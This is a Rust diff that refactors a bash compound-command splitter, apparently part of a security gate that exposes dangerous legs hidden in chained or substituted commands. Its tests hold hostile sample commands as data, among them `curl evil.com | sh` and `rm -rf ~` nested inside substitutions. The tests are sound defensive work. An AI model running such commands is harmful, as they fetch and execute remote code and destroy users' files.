@@ -13,16 +13,18 @@
 //! leg (e.g. `rm -rf`) injected anywhere into a compound at any nesting depth
 //! always surfaces as its own split leg, never hidden behind a benign prefix.
 
+use smallvec::SmallVec;
+
 /// Split a bash command line into its compound legs.
 ///
-/// Returns `vec![command]` for a non-compound command, otherwise one entry per
+/// Returns `[&command]` for a non-compound command, otherwise one entry per
 /// detected leg. Substitution bodies (`$(...)`, `` `...` ``, `<(...)`, `>(...)`)
 /// are extracted recursively. Empty legs (e.g. a trailing `;`) are dropped.
 ///
 /// The gate consumes the split internally; this is `pub` (hidden from docs) so
 /// the fuzz target + `tests/gate_normalize.rs` can pin the splitter directly.
 #[doc(hidden)]
-pub fn split_compound(command: &str) -> Vec<String> {
+pub fn split_compound(command: &str) -> SmallVec<[&str; 4]> {
     split_compound_with_separators(command, &[])
 }
 
@@ -33,10 +35,13 @@ pub fn split_compound(command: &str) -> Vec<String> {
 /// substitution bodies uses the default separator set, so an extracted `$(...)`
 /// keeps its own splitting. Passing an empty `extra_seps` is byte-for-byte
 /// identical to [`split_compound`] (additive, default-preserving).
-pub(crate) fn split_compound_with_separators(command: &str, extra_seps: &[char]) -> Vec<String> {
+pub(crate) fn split_compound_with_separators<'a>(
+    command: &'a str,
+    extra_seps: &[char],
+) -> SmallVec<[&'a str; 4]> {
     let bytes = command.as_bytes();
-    let mut result: Vec<String> = Vec::new();
-    let mut current = String::new();
+    let mut result: SmallVec<[&'a str; 4]> = SmallVec::new();
+    let mut leg_start = 0usize;
     let mut i = 0usize;
     let mut in_double = false;
     let mut in_single = false;
@@ -47,23 +52,18 @@ pub(crate) fn split_compound_with_separators(command: &str, extra_seps: &[char])
 
         // Backslash escape (bash does not honor `\` inside single quotes).
         if !in_single && c == b'\\' && i + 1 < bytes.len() {
-            current.push(c as char);
-            current.push(bytes[i + 1] as char);
             i += 2;
             continue;
         }
 
-        // Quote toggles. Keep the quote char in `current` so callers see the
-        // original token text.
+        // Quote toggles.
         if c == b'"' && !in_single {
             in_double = !in_double;
-            current.push(c as char);
             i += 1;
             continue;
         }
         if c == b'\'' && !in_double {
             in_single = !in_single;
-            current.push(c as char);
             i += 1;
             continue;
         }
@@ -71,67 +71,69 @@ pub(crate) fn split_compound_with_separators(command: &str, extra_seps: &[char])
         if !in_double && !in_single {
             // `$(...)` command substitution (depth-tracked for nesting).
             if c == b'$' && next == Some(b'(') {
-                push_leg(&mut current, &mut result);
-                let (inner, advanced) = extract_paren_body(bytes, i + 2);
+                push_leg(command, leg_start, i, &mut result);
+                let (inner, advanced) = extract_paren_body(command, i + 2);
                 i = advanced;
-                result.extend(split_compound(&inner));
+                leg_start = i;
+                result.extend(split_compound(inner));
                 continue;
             }
             // Backtick command substitution.
             if c == b'`' {
-                push_leg(&mut current, &mut result);
-                let (inner, advanced) = extract_backtick_body(bytes, i + 1);
+                push_leg(command, leg_start, i, &mut result);
+                let (inner, advanced) = extract_backtick_body(command, i + 1);
                 i = advanced;
-                result.extend(split_compound(&inner));
+                leg_start = i;
+                result.extend(split_compound(inner));
                 continue;
             }
             // `<(...)` / `>(...)` process substitution.
             if (c == b'<' || c == b'>') && next == Some(b'(') {
-                push_leg(&mut current, &mut result);
-                let (inner, advanced) = extract_paren_body(bytes, i + 2);
+                push_leg(command, leg_start, i, &mut result);
+                let (inner, advanced) = extract_paren_body(command, i + 2);
                 i = advanced;
-                result.extend(split_compound(&inner));
+                leg_start = i;
+                result.extend(split_compound(inner));
                 continue;
             }
             // `&&` / `||`.
             if (c == b'&' && next == Some(b'&')) || (c == b'|' && next == Some(b'|')) {
-                push_leg(&mut current, &mut result);
+                push_leg(command, leg_start, i, &mut result);
                 i += 2;
+                leg_start = i;
                 continue;
             }
             // Single-char separators: `;`, `|`, `&`, newline.
             if c == b';' || c == b'|' || c == b'&' || c == b'\n' {
-                push_leg(&mut current, &mut result);
+                push_leg(command, leg_start, i, &mut result);
                 i += 1;
+                leg_start = i;
                 continue;
             }
             // Extra top-level separators (e.g. an `IFS=<char>` reassignment).
             if extra_seps.contains(&(c as char)) {
-                push_leg(&mut current, &mut result);
+                push_leg(command, leg_start, i, &mut result);
                 i += 1;
+                leg_start = i;
                 continue;
             }
             // Bare subshell parens are not separators themselves; strip them so
             // the contained legs read cleanly (`( ls && rm )` -> `ls`, `rm`).
             if c == b'(' || c == b')' {
-                push_leg(&mut current, &mut result);
+                push_leg(command, leg_start, i, &mut result);
                 i += 1;
+                leg_start = i;
                 continue;
             }
         }
 
-        current.push(c as char);
         i += 1;
     }
-    push_leg(&mut current, &mut result);
+    push_leg(command, leg_start, bytes.len(), &mut result);
     result
 }
 
 /// True iff `command` decomposes into more than one logical leg.
-///
-/// No production caller remains (the gate works on the split legs directly);
-/// retained as a crate-internal helper because its behavior is pinned by the
-/// unit tests below.
 #[allow(dead_code)]
 pub(crate) fn is_compound(command: &str) -> bool {
     split_compound(command).len() > 1
@@ -150,9 +152,9 @@ pub(crate) fn is_compound(command: &str) -> bool {
 /// `split_compound` + taxonomy pipeline). Bounded by [`MAX_SUBST_BODIES`] and the
 /// substitution depth-tracking already present in the extractors, so a crafted
 /// nest cannot blow up.
-pub(crate) fn extract_double_quoted_substitutions(leg: &str) -> Vec<String> {
+pub(crate) fn extract_double_quoted_substitutions<'a>(leg: &'a str) -> SmallVec<[&'a str; 2]> {
     let bytes = leg.as_bytes();
-    let mut bodies: Vec<String> = Vec::new();
+    let mut bodies: SmallVec<[&'a str; 2]> = SmallVec::new();
     let mut i = 0usize;
     let mut in_double = false;
     let mut in_single = false;
@@ -179,13 +181,13 @@ pub(crate) fn extract_double_quoted_substitutions(leg: &str) -> Vec<String> {
         // Only INSIDE a double-quoted span is a substitution live.
         if in_double && !in_single {
             if c == b'$' && next == Some(b'(') {
-                let (inner, advanced) = extract_paren_body(bytes, i + 2);
+                let (inner, advanced) = extract_paren_body(leg, i + 2);
                 i = advanced;
                 bodies.push(inner);
                 continue;
             }
             if c == b'`' {
-                let (inner, advanced) = extract_backtick_body(bytes, i + 1);
+                let (inner, advanced) = extract_backtick_body(leg, i + 1);
                 i = advanced;
                 bodies.push(inner);
                 continue;
@@ -200,27 +202,28 @@ pub(crate) fn extract_double_quoted_substitutions(leg: &str) -> Vec<String> {
 /// consistent with the normalize/decode bounds (no unbounded fan-out).
 pub(crate) const MAX_SUBST_BODIES: usize = 64;
 
-/// Trim and push `current` as a leg if non-empty, then clear it.
-fn push_leg(current: &mut String, result: &mut Vec<String>) {
-    let trimmed = current.trim();
-    if !trimmed.is_empty() {
-        result.push(trimmed.to_string());
+/// Trim and push `command[start..end]` as a leg slice if non-empty.
+fn push_leg<'a>(command: &'a str, start: usize, end: usize, result: &mut SmallVec<[&'a str; 4]>) {
+    if start < end && end <= command.len() {
+        let trimmed = command[start..end].trim();
+        if !trimmed.is_empty() {
+            result.push(trimmed);
+        }
     }
-    current.clear();
 }
 
 /// Extract a parenthesized body starting at `start` (just past the opening
-/// `(`), tracking nested parens. Returns the inner text and the index just
-/// past the matching `)` (or end-of-input).
-fn extract_paren_body(bytes: &[u8], start: usize) -> (String, usize) {
+/// `(`), tracking nested parens. Returns the inner text slice and the index
+/// just past the matching `)` (or end-of-input).
+fn extract_paren_body(command: &str, start: usize) -> (&str, usize) {
+    let bytes = command.as_bytes();
     let mut i = start;
     let mut depth = 1usize;
-    let mut inner = String::new();
+    let body_start = start;
+    let mut body_end = start;
     while i < bytes.len() && depth > 0 {
         let c = bytes[i];
         if c == b'\\' && i + 1 < bytes.len() {
-            inner.push(c as char);
-            inner.push(bytes[i + 1] as char);
             i += 2;
             continue;
         }
@@ -229,36 +232,38 @@ fn extract_paren_body(bytes: &[u8], start: usize) -> (String, usize) {
         } else if c == b')' {
             depth -= 1;
             if depth == 0 {
+                body_end = i;
                 i += 1;
                 break;
             }
         }
-        inner.push(c as char);
         i += 1;
     }
-    (inner, i)
+    if depth > 0 {
+        body_end = i;
+    }
+    (&command[body_start..body_end], i)
 }
 
 /// Extract a backtick body starting at `start` (just past the opening
-/// backtick). Returns the inner text and the index just past the closing
+/// backtick). Returns the inner text slice and the index just past the closing
 /// backtick (or end-of-input).
-fn extract_backtick_body(bytes: &[u8], start: usize) -> (String, usize) {
+fn extract_backtick_body(command: &str, start: usize) -> (&str, usize) {
+    let bytes = command.as_bytes();
     let mut i = start;
-    let mut inner = String::new();
+    let body_start = start;
     while i < bytes.len() && bytes[i] != b'`' {
         if bytes[i] == b'\\' && i + 1 < bytes.len() {
-            inner.push(bytes[i] as char);
-            inner.push(bytes[i + 1] as char);
             i += 2;
             continue;
         }
-        inner.push(bytes[i] as char);
         i += 1;
     }
+    let body_end = i;
     if i < bytes.len() {
         i += 1; // skip closing backtick
     }
-    (inner, i)
+    (&command[body_start..body_end], i)
 }
 
 #[cfg(test)]
@@ -268,112 +273,112 @@ mod tests {
     #[test]
     fn splits_on_and_and() {
         assert_eq!(
-            split_compound("git status && echo done"),
-            vec!["git status", "echo done"]
+            split_compound("git status && echo done").as_slice(),
+            &["git status", "echo done"]
         );
     }
 
     #[test]
     fn splits_on_or_or() {
         assert_eq!(
-            split_compound("test -f foo || touch foo"),
-            vec!["test -f foo", "touch foo"]
+            split_compound("test -f foo || touch foo").as_slice(),
+            &["test -f foo", "touch foo"]
         );
     }
 
     #[test]
     fn splits_on_semicolon() {
-        assert_eq!(split_compound("cd src; ls"), vec!["cd src", "ls"]);
+        assert_eq!(split_compound("cd src; ls").as_slice(), &["cd src", "ls"]);
     }
 
     #[test]
     fn splits_on_single_pipe() {
         assert_eq!(
-            split_compound("git status | rm -rf /tmp/x"),
-            vec!["git status", "rm -rf /tmp/x"]
+            split_compound("git status | rm -rf /tmp/x").as_slice(),
+            &["git status", "rm -rf /tmp/x"]
         );
     }
 
     #[test]
     fn splits_on_single_ampersand_background() {
         assert_eq!(
-            split_compound("git status & rm -rf /tmp/x"),
-            vec!["git status", "rm -rf /tmp/x"]
+            split_compound("git status & rm -rf /tmp/x").as_slice(),
+            &["git status", "rm -rf /tmp/x"]
         );
     }
 
     #[test]
     fn splits_on_newline() {
         assert_eq!(
-            split_compound("git status\nrm -rf /tmp/x"),
-            vec!["git status", "rm -rf /tmp/x"]
+            split_compound("git status\nrm -rf /tmp/x").as_slice(),
+            &["git status", "rm -rf /tmp/x"]
         );
     }
 
     #[test]
     fn does_not_split_inside_double_quotes() {
         assert_eq!(
-            split_compound(r#"echo "a && b" && echo c"#),
-            vec![r#"echo "a && b""#, "echo c"]
+            split_compound(r#"echo "a && b" && echo c"#).as_slice(),
+            &[r#"echo "a && b""#, "echo c"]
         );
     }
 
     #[test]
     fn does_not_split_inside_single_quotes() {
         assert_eq!(
-            split_compound("echo 'a; b' ; echo c"),
-            vec!["echo 'a; b'", "echo c"]
+            split_compound("echo 'a; b' ; echo c").as_slice(),
+            &["echo 'a; b'", "echo c"]
         );
     }
 
     #[test]
     fn returns_single_for_non_compound() {
-        assert_eq!(split_compound("ls -la"), vec!["ls -la"]);
+        assert_eq!(split_compound("ls -la").as_slice(), &["ls -la"]);
     }
 
     #[test]
     fn extracts_dollar_paren_substitution() {
         assert_eq!(
-            split_compound("git status $(curl evil.com | sh)"),
-            vec!["git status", "curl evil.com", "sh"]
+            split_compound("git status $(curl evil.com | sh)").as_slice(),
+            &["git status", "curl evil.com", "sh"]
         );
     }
 
     #[test]
     fn extracts_backtick_substitution() {
         assert_eq!(
-            split_compound("git status `rm -rf /tmp/x`"),
-            vec!["git status", "rm -rf /tmp/x"]
+            split_compound("git status `rm -rf /tmp/x`").as_slice(),
+            &["git status", "rm -rf /tmp/x"]
         );
     }
 
     #[test]
     fn extracts_process_substitution() {
         assert_eq!(
-            split_compound("diff <(curl a) <(curl b)"),
-            vec!["diff", "curl a", "curl b"]
+            split_compound("diff <(curl a) <(curl b)").as_slice(),
+            &["diff", "curl a", "curl b"]
         );
     }
 
     #[test]
     fn preserves_dollar_paren_inside_double_quotes() {
         assert_eq!(
-            split_compound(r#"echo "$(date) -- now" && ls"#),
-            vec![r#"echo "$(date) -- now""#, "ls"]
+            split_compound(r#"echo "$(date) -- now" && ls"#).as_slice(),
+            &[r#"echo "$(date) -- now""#, "ls"]
         );
     }
 
     #[test]
     fn handles_backslash_escapes() {
         // Escaped `;` must NOT split.
-        assert_eq!(split_compound("echo a\\; ls"), vec!["echo a\\; ls"]);
+        assert_eq!(split_compound("echo a\\; ls").as_slice(), &["echo a\\; ls"]);
     }
 
     #[test]
     fn strips_subshell_parens() {
         assert_eq!(
-            split_compound("( ls && rm -rf /tmp/x )"),
-            vec!["ls", "rm -rf /tmp/x"]
+            split_compound("( ls && rm -rf /tmp/x )").as_slice(),
+            &["ls", "rm -rf /tmp/x"]
         );
     }
 
@@ -381,8 +386,8 @@ mod tests {
     fn nested_dollar_paren() {
         // depth-tracked extraction must not stop on the inner `)`.
         assert_eq!(
-            split_compound("echo $(echo $(rm -rf /tmp/x))"),
-            vec!["echo", "echo", "rm -rf /tmp/x"]
+            split_compound("echo $(echo $(rm -rf /tmp/x))").as_slice(),
+            &["echo", "echo", "rm -rf /tmp/x"]
         );
     }
 
@@ -396,20 +401,20 @@ mod tests {
 
     #[test]
     fn drops_trailing_separator_empty_leg() {
-        assert_eq!(split_compound("ls;"), vec!["ls"]);
+        assert_eq!(split_compound("ls;").as_slice(), &["ls"]);
     }
 
     #[test]
     fn extra_separators_are_additive() {
         // Empty extra-sep set == default behavior (byte-for-byte).
         assert_eq!(
-            split_compound_with_separators("git status && echo done", &[]),
-            split_compound("git status && echo done")
+            split_compound_with_separators("git status && echo done", &[]).as_slice(),
+            split_compound("git status && echo done").as_slice()
         );
         // An extra `X` separator splits at top level in addition to the defaults.
         assert_eq!(
-            split_compound_with_separators("aXb; c", &['X']),
-            vec!["a", "b", "c"]
+            split_compound_with_separators("aXb; c", &['X']).as_slice(),
+            &["a", "b", "c"]
         );
     }
 
@@ -417,16 +422,16 @@ mod tests {
     fn extract_double_quoted_substitutions_finds_live_bodies() {
         // `$()`/backtick inside DOUBLE quotes is live -> extracted.
         assert_eq!(
-            extract_double_quoted_substitutions(r#"echo "$(rm -rf ~)""#),
-            vec!["rm -rf ~".to_string()]
+            extract_double_quoted_substitutions(r#"echo "$(rm -rf ~)""#).as_slice(),
+            &["rm -rf ~"]
         );
         assert_eq!(
-            extract_double_quoted_substitutions(r#"git commit -m "`rm -rf ~`""#),
-            vec!["rm -rf ~".to_string()]
+            extract_double_quoted_substitutions(r#"git commit -m "`rm -rf ~`""#).as_slice(),
+            &["rm -rf ~"]
         );
         assert_eq!(
-            extract_double_quoted_substitutions(r#"echo "$(rm -rf ~)" "$(echo ok)""#),
-            vec!["rm -rf ~".to_string(), "echo ok".to_string()]
+            extract_double_quoted_substitutions(r#"echo "$(rm -rf ~)" "$(echo ok)""#).as_slice(),
+            &["rm -rf ~", "echo ok"]
         );
     }
 
@@ -460,8 +465,8 @@ mod tests {
         // The extra separator applies at the TOP level only — the `$(...)` body
         // is split with the default set, so an `X` inside it is NOT a separator.
         assert_eq!(
-            split_compound_with_separators("aXb $(echo cXd)", &['X']),
-            vec!["a", "b", "echo cXd"]
+            split_compound_with_separators("aXb $(echo cXd)", &['X']).as_slice(),
+            &["a", "b", "echo cXd"]
         );
     }
 }
@@ -517,7 +522,7 @@ mod proptests {
 
             let split = split_compound(&cmd);
             prop_assert!(
-                split.iter().any(|l| l == &rm),
+                split.contains(&rm.as_str()),
                 "rm leg lost: cmd=`{cmd}` -> {split:?}"
             );
         }
@@ -539,7 +544,7 @@ mod proptests {
 
             let split = split_compound(&cmd);
             prop_assert!(
-                split.iter().any(|l| l == rm),
+                split.contains(&rm),
                 "nested rm leg lost (depth={depth}): cmd=`{cmd}` -> {split:?}"
             );
         }
